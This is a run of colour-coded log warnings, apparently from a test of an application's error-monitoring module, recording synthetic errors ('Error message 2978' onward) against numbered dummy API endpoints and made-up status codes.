WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847651Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2978'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847704Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2979'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847754Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2980'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847803Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2981'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847852Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2982'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847900Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2983'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847949Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2984'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847997Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2985'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848049Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2986'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848099Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2987'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848149Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2988'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848198Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2989'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848248Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2990'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848297Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2991'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848346Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2992'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848395Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2993'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848443Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2994'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848491Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2995'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848592Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2996'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848665Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2997'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848722Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2998'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848774Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2999'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848823Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3000'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848873Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3001'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848921Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3002'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.848969Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3003'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849017Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3004'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849065Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3005'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849113Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3006'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849171Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3007'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849220Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3008'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849268Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3009'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849316Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3010'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849363Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3011'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849411Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3012'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849459Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3013'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849512Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3014'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849566Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3015'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849615Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3016'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849662Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3017'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
